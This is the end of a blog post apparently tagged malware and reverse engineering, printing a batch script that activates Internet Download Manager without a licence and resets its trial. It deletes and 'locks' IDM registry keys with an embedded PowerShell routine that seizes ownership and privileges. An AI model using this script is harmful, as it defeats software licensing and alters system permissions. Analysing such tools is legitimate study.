&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;FName&#34;&#34;
&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;LName&#34;&#34;
&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;Email&#34;&#34;
&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;Serial&#34;&#34;
&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;scansk&#34;&#34;
&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;tvfrdt&#34;&#34;
&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;radxcnt&#34;&#34;
&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;LstCheck&#34;&#34;
&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;ptrk_scdt&#34;&#34;
&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;LastCheckQU&#34;&#34;
&#34;%HKLM%&#34;
) do for /f &#34;tokens=* delims=&#34; %%A in (&#34;%%~#&#34;) do (
set &#34;reg=&#34;%%~A&#34;&#34; &amp;reg query !reg! %nul% &amp;&amp; call :delete_key
)

exit /b

::========================================================================================================================================

:add_key

echo:
echo Adding registry key...
rem echo:

set &#34;reg=&#34;%HKLM%&#34; /v &#34;AdvIntDriverEnabled2&#34;&#34;

reg add %reg% /t REG_DWORD /d &#34;1&#34; /f %nul%

:_add_key

if [%errorlevel%]==[0] (
set &#34;reg=%reg:&#34;=%&#34;
rem echo Added - !reg!
) else (
set _error=1
set &#34;reg=%reg:&#34;=%&#34;
%_psc% write-host &#39;Failed&#39; -fore &#39;white&#39; -back &#39;DarkRed&#39;  -NoNewline&amp;echo  - !reg!
)
exit /b

::========================================================================================================================================

:action

if exist %regdata% del /f /q %regdata% %nul%

reg query %CLSID% &gt; %regdata%

%nul% %_psc% &#34;(gc %regdata%) -replace &#39;HKEY_CURRENT_USER&#39;, &#39;HKCU&#39; | Out-File -encoding ASCII %regdata%&#34;

for /f %%a in (%regdata%) do (
for /f &#34;tokens=%_tok% delims=\&#34; %%# in (&#34;%%a&#34;) do (
echo %%#|findstr /r &#34;{.*-.*-.*-.*-.*}&#34; &gt;nul &amp;&amp; (set &#34;reg=%%a&#34; &amp; call :scan_key)
)
)

if exist %regdata% del /f /q %regdata% %nul%

exit /b

::========================================================================================================================================

:scan_key

reg query %reg% 2&gt;nul | findstr /i &#34;LocalServer32 InProcServer32 InProcHandler32&#34; &gt;nul &amp;&amp; exit /b

reg query %reg% 2&gt;nul | find /i &#34;H&#34; 1&gt;nul || (
%_action%
exit /b
)

for /f &#34;skip=2 tokens=*&#34; %%a in (&#39;reg query %reg% /ve 2^&gt;nul&#39;) do echo %%a|findstr /r /e &#34;[^0-9]&#34; &gt;nul || (
%_action%
exit /b
)

for /f &#34;skip=2 tokens=3&#34; %%a in (&#39;reg query %reg%\Version /ve 2^&gt;nul&#39;) do echo %%a|findstr /r &#34;[^0-9]&#34; &gt;nul || (
%_action%
exit /b
)

for /f &#34;skip=2 tokens=1&#34; %%a in (&#39;reg query %reg% 2^&gt;nul&#39;) do echo %%a| findstr /i &#34;MData Model scansk Therad&#34; &gt;nul &amp;&amp; (
%_action%
exit /b
)

for /f &#34;skip=2 tokens=*&#34; %%a in (&#39;reg query %reg% /ve 2^&gt;nul&#39;) do echo %%a| find /i &#34;+&#34; &gt;nul &amp;&amp; (
%_action%
exit /b
)

exit/b

::========================================================================================================================================

:delete_key

reg delete %reg% /f %nul%

if not [%errorlevel%]==[0] if defined take_permission (
%nul% call :reg_own &#34;%reg%&#34; preserve S-1-1-0
reg delete %reg% /f %nul%
)

if [%errorlevel%]==[0] (
set &#34;reg=%reg:&#34;=%&#34;
rem echo Deleted - !reg!
) else (
set &#34;reg=%reg:&#34;=%&#34;
set _error=1
%_psc% write-host &#39;Failed&#39; -fore &#39;white&#39; -back &#39;DarkRed&#39;  -NoNewline &amp; echo  - !reg!
)

exit /b

::========================================================================================================================================

:lock_key

%nul% call :reg_own &#34;%reg%&#34; &#34;&#34; S-1-1-0 S-1-0-0 Deny &#34;FullControl&#34;

reg delete %reg% /f %nul%

if not [%errorlevel%]==[0] (
set &#34;reg=%reg:&#34;=%&#34;
rem echo Locked - !reg!
set /a lockedkeys+=1
) else (
set _error=1
set &#34;reg=%reg:&#34;=%&#34;
%_psc% write-host &#39;Failed&#39; -fore &#39;white&#39; -back &#39;DarkRed&#39;  -NoNewline&amp;echo  - !reg!
)

exit /b

::========================================================================================================================================

:count_key

set /a foundkeys+=1
exit /b

::========================================================================================================================================

::  A lean and mean snippet to set registry ownership and permission recursively
::  Written by @AveYo aka @BAU
::  pastebin.com/XTPt0JSC

:reg_own

%_psc% $A=&#39;%~1&#39;,&#39;%~2&#39;,&#39;%~3&#39;,&#39;%~4&#39;,&#39;%~5&#39;,&#39;%~6&#39;;iex(([io.file]::ReadAllText(&#39;!_batp!&#39;)-split&#39;:Own1\:.*&#39;)[1])&amp;exit/b:Own1:
$D1=[uri].module.gettype(&#39;System.Diagnostics.Process&#39;).&#34;GetM`ethods&#34;(42) |where {$_.Name -eq &#39;SetPrivilege&#39;} #`:no-ev-warn
&#39;SeSecurityPrivilege&#39;,&#39;SeTakeOwnershipPrivilege&#39;,&#39;SeBackupPrivilege&#39;,&#39;SeRestorePrivilege&#39;|foreach {$D1.Invoke($null, @(&#34;$_&#34;,2))}
$path=$A[0]; $rk=$path-split&#39;\\&#39;,2; $HK=gi -lit Registry::$($rk[0]) -fo; $s=$A[1]; $sps=[Security.Principal.SecurityIdentifier]
$u=($A[2],&#39;S-1-5-32-544&#39;)[!$A[2]];$o=($A[3],$u)[!$A[3]];$w=$u,$o |% {new-object $sps($_)}; $old=!$A[3];$own=!$old; $y=$s-eq&#39;all&#39;
$rar=new-object Security.AccessControl.RegistryAccessRule( $w[0], ($A[5],&#39;FullControl&#39;)[!$A[5]], 1, 0, ($A[4],&#39;Allow&#39;)[!$A[4]] )
$x=$s-eq&#39;none&#39;;function Own1($k){$t=$HK.OpenSubKey($k,2,&#39;TakeOwnership&#39;);if($t){0,4|%{try{$o=$t.GetAccessControl($_)}catch{$old=0}
};if($old){$own=1;$w[1]=$o.GetOwner($sps)};$o.SetOwner($w[0]);$t.SetAccessControl($o); $c=$HK.OpenSubKey($k,2,&#39;ChangePermissions&#39;)
$p=$c.GetAccessControl(2);if($y){$p.SetAccessRuleProtection(1,1)};$p.ResetAccessRule($rar);if($x){$p.RemoveAccessRuleAll($rar)}
$c.SetAccessControl($p);if($own){$o.SetOwner($w[1]);$t.SetAccessControl($o)};if($s){$subkeys=$HK.OpenSubKey($k).GetSubKeyNames()
foreach($n in $subkeys){Own1 &#34;$k\$n&#34;}}}};Own1 $rk[1];if($env:VO){get-acl Registry::$path|fl} #:Own1: lean &amp; mean snippet by AveYo

::========================================================================================================================================

:_color

if %winbuild% GEQ 10586 (
echo %esc%[%~1%~2%esc%[0m
) else (
call :batcol %~1 &#34;%~2&#34;
)
exit /b

:_color2

if %winbuild% GEQ 10586 (
echo %esc%[%~1%~2%esc%[%~3%~4%esc%[0m
) else (
call :batcol %~1 &#34;%~2&#34; %~3 &#34;%~4&#34;
)
exit /b

::=======================================

:: Colored text with pure batch method

:: Powershell is not used here because its slow

:batcol

pushd %_coltemp%
if not exist &#34;&#39;&#34; (&lt;nul &gt;&#34;&#39;&#34; set /p &#34;=.&#34;)
setlocal
set &#34;s=%~2&#34;
set &#34;t=%~4&#34;
call :_batcol %1 s %3 t
del /f /q &#34;&#39;&#34;
del /f /q &#34;`.txt&#34;
popd
exit /b

:_batcol

setlocal EnableDelayedExpansion
set &#34;s=!%~2!&#34;
set &#34;t=!%~4!&#34;
for /f delims^=^ eol^= %%i in (&#34;!s!&#34;) do (
  if &#34;!&#34; equ &#34;&#34; setlocal DisableDelayedExpansion
    &gt;`.txt (echo %%i\..\&#39;)
    findstr /a:%~1 /f:`.txt &#34;.&#34;
    &lt;nul set /p &#34;=%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%&#34;
)
if &#34;%~4&#34;==&#34;&#34; echo(&amp;exit /b
setlocal EnableDelayedExpansion
for /f delims^=^ eol^= %%i in (&#34;!t!&#34;) do (
  if &#34;!&#34; equ &#34;&#34; setlocal DisableDelayedExpansion
    &gt;`.txt (echo %%i\..\&#39;)
    findstr /a:%~3 /f:`.txt &#34;.&#34;
    &lt;nul set /p &#34;=%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%&#34;
)
echo(
exit /b

::=======================================

:_colorprep

if %winbuild% GEQ 10586 (
for /F %%a in (&#39;echo prompt $E ^| cmd&#39;) do set &#34;esc=%%a&#34;

set     &#34;Red=&#34;41;97m&#34;&#34;
set    &#34;Gray=&#34;100;97m&#34;&#34;
set   &#34;Black=&#34;30m&#34;&#34;
set   &#34;Green=&#34;42;97m&#34;&#34;
set    &#34;Blue=&#34;44;97m&#34;&#34;
set  &#34;Yellow=&#34;43;97m&#34;&#34;
set &#34;Magenta=&#34;45;97m&#34;&#34;

set    &#34;_Red=&#34;40;91m&#34;&#34;
set  &#34;_Green=&#34;40;92m&#34;&#34;
set   &#34;_Blue=&#34;40;94m&#34;&#34;
set  &#34;_White=&#34;40;37m&#34;&#34;
set &#34;_Yellow=&#34;40;93m&#34;&#34;

exit /b
)

if not defined _BS for /f %%A in (&#39;&#34;prompt $H&amp;for %%B in (1) do rem&#34;&#39;) do set &#34;_BS=%%A %%A&#34;
set &#34;_coltemp=%SystemRoot%\Temp&#34;

set     &#34;Red=&#34;CF&#34;&#34;
set    &#34;Gray=&#34;8F&#34;&#34;
set   &#34;Black=&#34;00&#34;&#34;
set   &#34;Green=&#34;2F&#34;&#34;
set    &#34;Blue=&#34;1F&#34;&#34;
set  &#34;Yellow=&#34;6F&#34;&#34;
set &#34;Magenta=&#34;5F&#34;&#34;

set    &#34;_Red=&#34;0C&#34;&#34;
set  &#34;_Green=&#34;0A&#34;&#34;
set   &#34;_Blue=&#34;09&#34;&#34;
set  &#34;_White=&#34;07&#34;&#34;
set &#34;_Yellow=&#34;0E&#34;&#34;

exit /b

::========================================================================================================================================

:txt:
_________________________________

   Activation:
_________________________________

 - This tool applies registry lock method to activate Internet download manager (IDM).

 - This method requires Internet at the time of activation.

 - IDM updates can be installed directly without having to activate again.

 - After the activation, if in some case, the IDM starts to show activation nag screen, 
   then just run the activation option again.

_________________________________

   Reset IDM Activation / Trial:
_________________________________

 - Internet download manager provides 30 days trial period, you can use this script to 
   reset this Activation / Trial period whenever you want.

 - This option also can be used to restore status if in case the IDM reports fake serial
   key and other similar errors.

_________________________________

   OS requirement:
_________________________________

 - Project is supported only for Windows 7/8/8.1/10/11 and their Server equivalent.

_________________________________

 - Troubleshooting steps:
_________________________________

 - If any other activator was used to activate IDM previously then make sure to properly
   uninstall it with that same activator (if there is an option), this is especially important
   if any registry / firewall block method was used.

 - Uninstall the IDM from control panel.

 - Make sure the latest original IDM setup is used for the installation,
   you can download it from https://www.internetdownloadmanager.com/download.html

 - Now install the IDM and use the activate option.

____________________________________________________________________________________________________
:txt:

::========================================================================================================================================
</code></pre></li></ul></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-11-13</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/cybersecurity/>cybersecurity</a>,&nbsp;<a href=/tags/reverse/>Reverse</a>,&nbsp;<a href=/tags/malware/>malware</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/writeup-for-orgctf2-crypto/ class=prev rel=prev title="Writeup for ORGCTF2: Crypto.my_own_cryptography"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Writeup for ORGCTF2: Crypto.my_own_cryptography</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=www.debidong.github.io target=_blank>debidong</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>